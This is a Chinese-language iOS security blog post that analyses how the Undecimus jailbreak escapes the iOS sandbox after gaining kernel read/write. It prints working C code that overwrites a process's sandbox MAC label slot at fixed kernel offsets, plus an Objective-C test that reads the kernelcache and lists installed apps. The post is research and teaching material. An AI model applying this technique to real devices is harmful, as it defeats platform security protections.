<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Undecimus 分析（一）Escape from Sandbox"><meta name="keywords" content="JailBreak,Undecimus,Sandbox Escape"><meta name="author" content="高级页面仔 (Soulghost)"><meta name="copyright" content="高级页面仔 (Soulghost)"><title>Undecimus 分析（一）Escape from Sandbox | iOS Security Cabin</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#The-Sandbox"><span class="toc-number">2.</span> <span class="toc-text">The Sandbox</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Apple-Mobile-File-Integrity"><span class="toc-number">2.1.</span> <span class="toc-text">Apple Mobile File Integrity</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sandbox-Kext"><span class="toc-number">2.2.</span> <span class="toc-text">Sandbox Kext</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Policy-的内核表示"><span class="toc-number">3.</span> <span class="toc-text">Policy 的内核表示</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Escape-Now"><span class="toc-number">4.</span> <span class="toc-text">Escape Now</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">6.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://avatars0.githubusercontent.com/u/6300263?s=460&amp;u=c55866a279854c9150528b358802a75be5e6a507&amp;v=4"></div><div class="author-info__name text-center">高级页面仔 (Soulghost)</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/Soulghost" target="_blank" rel="noopener">Follow Me on GitHub</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">10</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">19</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">iOS Security Cabin</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">Undecimus 分析（一）Escape from Sandbox</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-12-15</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在 Sock Port 系列文章中我们从 0 到 1 的介绍了通过 Socket UAF 拿到 tfp0 的全过程。从这篇文章开始我们将通过分析 <a href="https://github.com/pwn20wndstuff/Undecimus" target="_blank" rel="noopener">Undecimus</a> 介绍从 tfp0 到 jailbreak 的全过程。</p>
<p>单单通过 tfp0 能做的事情只是 kread, kwrite 等基础操作，要实现 rootfs read/write, kexec 等工作还需要非常复杂的步骤，本文将介绍通过 tfp0 逃出沙盒，实现 rootfs 读写的原理和过程。</p>
<h1 id="The-Sandbox"><a href="#The-Sandbox" class="headerlink" title="The Sandbox"></a>The Sandbox</h1><p>在 iOS 中有两个重要的内核扩展，分别是 <code>AppleMobileFileIntegrity.kext</code> 和 <code>Sandbox.kext</code>。</p>
<h2 id="Apple-Mobile-File-Integrity"><a href="#Apple-Mobile-File-Integrity" class="headerlink" title="Apple Mobile File Integrity"></a>Apple Mobile File Integrity</h2><p>根据 The iPhone Wiki 对 AMFI 的定义[1]:</p>
<blockquote>
<p>AppleMobileFileIntegrity(.kext), which can go by its full name com.apple.driver.AppleMobileFileIntegrity, is an iOS kernel extension which serves as the corner stone of iOS’s code entitlements model. It is one of the Sandbox’s (com.apple.security.sandbox) dependencies, along with com.apple.kext.AppleMatch (which, like on OS X, is responsible for parsing the Sandbox language rules).</p>
</blockquote>
<p>即 <code>AMFI.kext</code> 是实现 <code>iOS Code Entitlements</code> 的基础组件，它和 <code>AppleMatch.kext</code>(用于解析 Sandbox DSL) 都是 <code>Sandbox.kext</code> 的依赖。</p>
<p>可能有人对 Entitlements 并不熟悉，它代表着 App 拥有的权限。在正向开发中，如果我们为 App 开启 Capability 就会生成对应的 XML Units 插入到 <code>App.entitlements</code>，某些 Capability 只有特定的证书才能生成合法签名。通过这种手段可以限制 Userland App 的权限，从而保证系统安全。</p>
<p>在运行时，内核扩展会注册 Mac Policy 并 hook 特定的 Mach Calls[1]:</p>
<blockquote>
<p>Affectionately known as AMFI, this kext can be found in the iOS 5.0 iPod 4,1 kernel around 0x805E499C (start) and 0x805E3EE8 (Initialization function). The latter function registers a MAC policy (using the kernel exported mac_policy_register), which is used to hook various system operations and enforce Apple’s tight security policy.</p>
</blockquote>
<p>根据 Wiki，AMFI 会 hook 需要 <code>task_for_pid-allow</code> 权限的 Mach Call[1]:</p>
<blockquote>
<p>This kext recognizes the task_for_pid-allow entitlement (among others) and is responsible for hooking this Mach call, which retrieves the Mach task port associated with a BSD process identifier. Given this port, one can usurp control of the task/PID, reading and writing its memory, debugging, etc. It is therefore enabled only if the binary is digitally signed with a proper entitlement file, specifying task_for_pid-allow.</p>
</blockquote>
<p>即 <code>AMFI.kext</code> 会识别 entitlements 中的 <code>task_for_pid-allow</code>，并 Hook 相关 Mach Call，该 Mach Call 会通过 BSD 进程标识符查询特定进程的任务端口返回给调用者，使得调用者可以篡改进程的 task 或 PID, 甚至进行目标进程内存的读写和调试；而 <code>AMFI.kext</code> 会在调用前检查调用者的二进制是否拥有包含 <code>task_for_pid-allow</code> 的合法签名。</p>
<h2 id="Sandbox-Kext"><a href="#Sandbox-Kext" class="headerlink" title="Sandbox Kext"></a>Sandbox Kext</h2><p>Sandbox 的实现与 <code>AMFI.kext</code> 类似，也是通过 Hook 一系列的 Mach Call 并检查特定的 Policy 来保证访问的合法性。根据 Dionysus Blazakis 的 Paper: The Apple Sandbox 中的描述[2]：</p>
<blockquote>
<p>Once the sandbox is initialized, function calls hooked by the TrustedBSD layer will pass<br>through Sandbox.kext for policy enforcement. Depending on the system call, the extension<br>will consult the list of rules for the current process. Some rules (such as the example given<br>above denying access to files under the /opt/sekret path) will require pattern matching<br>support. Sandbox.kext imports functions from AppleMatch.kext to perform regular expression matching on the system call argument and the policy rule that is being checked.<br>For example, does the file being read match the denied path /opt/sekret/.*? The other<br>small part of the system is the Mach messages used to carry tracing information (such as<br>which operations are being checked) back to userspace for logging.</p>
</blockquote>
<p>上述引用主要包含了 3 个关键点：</p>
<ol>
<li>当 Sandbox 被初始化后，被 TrustedBSD layer 所 Hook 的 Mach Call 会通过 <code>Sandbox.kext</code> 执行权限检查；</li>
<li><code>Sandbox.kext</code> 会通过 <code>AppleMatch.kext</code> 解析规则 DSL，并生成 checklist；</li>
<li>通过 checklist 进行检查，例如被读取的 file path 是否在 denied path 列表中等。</li>
</ol>
<h1 id="Policy-的内核表示"><a href="#Policy-的内核表示" class="headerlink" title="Policy 的内核表示"></a>Policy 的内核表示</h1><p>在进程的 proc 结构中有一个 p_ucred 成员用于存储进程的 Identifier (Process owner’s identity. (PUCL))，它相当于进程的 Passport：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">    LIST_ENTRY(proc) p_list; <span class="comment">/* List of all processes. */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> * task; <span class="comment">/* corresponding task (static)*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p_pptr</span>;</span> <span class="comment">/* Pointer to parent process.(LL) */</span></span><br><span class="line">    <span class="keyword">pid_t</span> p_ppid;	</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">/* substructures: */</span></span><br><span class="line">    <span class="keyword">kauth_cred_t</span> p_ucred; <span class="comment">/* Process owner's identity. (PUCL) */</span></span><br></pre></td></tr></table></figure>

<p>PUCL 是一个 ucred 对象：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ucred</span> &#123;</span></span><br><span class="line">    TAILQ_ENTRY(ucred) cr_link; <span class="comment">/* never modify this without KAUTH_CRED_HASH_LOCK */</span></span><br><span class="line">    u_long cr_ref; <span class="comment">/* reference count */</span></span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">label</span> *<span class="title">cr_label</span>;</span> <span class="comment">/* MAC label */</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>cr_label</code> 成员指向了存储 MAC Policies 的数据结构 <code>label</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">label</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>	l_flags;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">    	<span class="keyword">void</span>	*l_ptr;</span><br><span class="line">    	<span class="keyword">long</span>	 l_long;</span><br><span class="line">    &#125; l_perpolicy[MAC_MAX_SLOTS];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>l_perpolicy</code> 数组记录了 MAC Policy 列表，AMFI 和 Sandbox 的 Policy 都会插入到相应进程的 <code>l_perpolicy</code> 中。</p>
<p>根据 Quarkslab Blogs 中的文章 <a href="https://blog.quarkslab.com/modern-jailbreaks-post-exploitation.html" target="_blank" rel="noopener">Modern Jailbreaks’ Post-Exploitation</a>，AMFI 和 Sandbox 分别插入到了 0 和 1 位置[3]：</p>
<blockquote>
<p>Each l_perpolicy “slot” is used by a particular MACF module, the first one being AMFI and the second one the sandbox. LiberiOS calls ShaiHulud2ProcessAtAddr to put 0 in its second label l_perpolicy[1]. Being the label used by the sandbox (processed in the function sb_evaluate), this move will neutralize it while keeping the label used by AMFI (Apple Mobile File Integrity) l_perpolicy[0] untouched (it’s more precise and prevent useful entitlement loss).</p>
</blockquote>
<p>即每个 <code>l_perpolicy</code> 插槽都被用于特定的 MACF 模块，第一个插槽被用于 AMFI，第二个被用于 Sandbox。LiberiOS 通过调用 <code>ShaiHulud2ProcessAtAddr</code> 在不修改第一个插槽的情况下将第二个插槽的指针置 0 来实现更加精准和稳定的沙盒逃逸。</p>
<h1 id="Escape-Now"><a href="#Escape-Now" class="headerlink" title="Escape Now"></a>Escape Now</h1><p>有了 tfp0 和上面的理论基础，实现沙盒逃逸的路径变得清晰了起来，我们只需要将当前进程的 <code>l_perpolicy[1]</code> 修改为 0，即可逃出沙盒。</p>
<p>首先读取到当前进程的 label，路径为 <code>proc-&gt;p_ucred-&gt;cr_label</code>，随后将索引为 1 的 Policy Slot 置 0：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KSTRUCT_OFFSET_PROC_UCRED 0xf8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KSTRUCT_OFFSET_UCRED_CR_LABEL 0x78</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">kptr_t</span> <span class="title">swap_sandbox_for_proc</span><span class="params">(<span class="keyword">kptr_t</span> proc, <span class="keyword">kptr_t</span> sandbox)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">kptr_t</span> ret = KPTR_NULL;</span><br><span class="line">    _assert(KERN_POINTER_VALID(proc));</span><br><span class="line">    <span class="keyword">kptr_t</span> <span class="keyword">const</span> ucred = ReadKernel64(proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));</span><br><span class="line">    _assert(KERN_POINTER_VALID(ucred));</span><br><span class="line">    <span class="keyword">kptr_t</span> <span class="keyword">const</span> cr_label = ReadKernel64(ucred + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL));</span><br><span class="line">    _assert(KERN_POINTER_VALID(cr_label));</span><br><span class="line">    <span class="keyword">kptr_t</span> <span class="keyword">const</span> sandbox_addr = cr_label + <span class="number">0x8</span> + <span class="number">0x8</span>;</span><br><span class="line">    <span class="keyword">kptr_t</span> <span class="keyword">const</span> current_sandbox = ReadKernel64(sandbox_addr);</span><br><span class="line">    _assert(WriteKernel64(sandbox_addr, sandbox));</span><br><span class="line">    ret = current_sandbox;</span><br><span class="line">out:;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里说明一下 <code>sandbox_addr</code> 的计算：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kptr_t</span> <span class="keyword">const</span> sandbox_addr = cr_label + <span class="number">0x8</span> + <span class="number">0x8</span>;</span><br></pre></td></tr></table></figure>
<p>我们再回顾下 label 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">label</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>	l_flags;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">    	<span class="keyword">void</span>	*l_ptr;</span><br><span class="line">    	<span class="keyword">long</span>	 l_long;</span><br><span class="line">    &#125; l_perpolicy[MAC_MAX_SLOTS];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>虽然 <code>l_flags</code> 本身只有 4 字节，但 <code>l_perpolicy</code> 占据了 8n 字节，为了按照最大成员对齐，<code>l_flags</code> 也会占据 8B，因此 <code>cr_label + 8</code> 指向了 <code>l_perpolicy</code>，再偏移 8B 则指向 Sandbox 的 Policy Slot。</p>
<p>通过上述操作我们便能躲过 <code>Sandbox.kext</code> 对进程的沙盒相关检查，实现沙盒逃逸，接下来无论是通过 C 还是 OC 的 File API 都可以对 rootfs 进行读写。在 Undecimus Jailbreak 中以这种方式读取了 kernelcache 并确定 Kernel Slide 和关键偏移量。</p>
<p>我们可以通过简单实验验证沙盒逃逸成功，下面的代码读取了 kernelcache 和 Applications 目录：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NSArray</span> *extractDir(<span class="built_in">NSString</span> *dirpath) &#123;</span><br><span class="line">    <span class="built_in">NSError</span> *error = <span class="literal">nil</span>;</span><br><span class="line">    <span class="built_in">NSArray</span> *contents = [[<span class="built_in">NSFileManager</span> defaultManager] contentsOfDirectoryAtPath:dirpath error:&amp;error];</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@"failed to get application list"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> contents;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> sandbox_escape_test() &#123;</span><br><span class="line">    <span class="built_in">NSError</span> *error = <span class="literal">nil</span>;</span><br><span class="line">    <span class="built_in">BOOL</span> success = [<span class="built_in">NSData</span> dataWithContentsOfFile:<span class="string">@"/System/Library/Caches/com.apple.kernelcaches/kernelcache"</span> options:<span class="built_in">NSDataReadingMappedAlways</span> error:&amp;error];</span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@"error occurred !!! %@"</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// list applications dir</span></span><br><span class="line">    error = <span class="literal">nil</span>;</span><br><span class="line">    <span class="built_in">NSFileManager</span> *mgr = [<span class="built_in">NSFileManager</span> defaultManager];</span><br><span class="line">    <span class="built_in">NSString</span> *applicationRoot = <span class="string">@"/var/containers/Bundle/Application/"</span>;</span><br><span class="line">    <span class="built_in">NSArray</span> *uuids = [mgr contentsOfDirectoryAtPath:applicationRoot error:&amp;error];</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@"failed to get application list"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">NSString</span> *uuid <span class="keyword">in</span> uuids) &#123;</span><br><span class="line">        <span class="built_in">NSString</span> *appPath = [applicationRoot stringByAppendingPathComponent:uuid];</span><br><span class="line">        <span class="built_in">NSArray</span> *contents = extractDir(appPath);</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">NSString</span> *content <span class="keyword">in</span> contents) &#123;</span><br><span class="line">            <span class="keyword">if</span> ([content hasSuffix:<span class="string">@".app"</span>]) &#123;</span><br><span class="line">                <span class="built_in">NSLog</span>(<span class="string">@"find %@ at %@ !!!"</span>, content, appPath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文简单介绍了通过 tfp0 实现 Sandbox Escape 的原理和过程，使得读者对 tfp0 能做的事情有一个简单认识。在接下来的文章中我们会介绍基于 tfp0 的 kexec 等利用。</p>
<p><img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.theiphonewiki.com/wiki/AppleMobileFileIntegrity" target="_blank" rel="noopener">AppleMobileFileIntegrity. The iPhone Wiki. </a></li>
<li><a href="https://dl.packetstormsecurity.net/papers/general/apple-sandbox.pdf" target="_blank" rel="noopener">The Apple Sandbox. Dionysus Blazakis. January 11, 2011.</a></li>
<li><a href="https://blog.quarkslab.com/modern-jailbreaks-post-exploitation.html" target="_blank" rel="noopener">Modern Jailbreaks’ Post-Exploitation. Marwan Anastas</a></li>
</ol>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">高级页面仔 (Soulghost)</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://blog.asm.im/2019/12/15/Undecimus-%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89Escape-from-Sandbox/">http://blog.asm.im/2019/12/15/Undecimus-%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89Escape-from-Sandbox/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JailBreak/">JailBreak</a><a class="post-meta__tags" href="/tags/Undecimus/">Undecimus</a><a class="post-meta__tags" href="/tags/Sandbox-Escape/">Sandbox Escape</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/12/29/Undecimus-%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89%E9%80%9A%E8%BF%87-String-XREF-%E5%AE%9A%E4%BD%8D%E5%86%85%E6%A0%B8%E6%95%B0%E6%8D%AE/"><i class="fa fa-chevron-left">  </i><span>Undecimus 分析（二）通过 String XREF 定位内核数据</span></a></div><div class="next-post pull-right"><a href="/2019/12/08/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89The-tfp0/"><span> Sock Port 漏洞解析（四）The tfp0 !</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2020 By 高级页面仔 (Soulghost)</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="footer_custom_text"><i class="fa fa-user"> 0xfffffff007004000</i><span class="footer-separator">|</span><i class="fa fa-eye"> 0x2004000</i></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>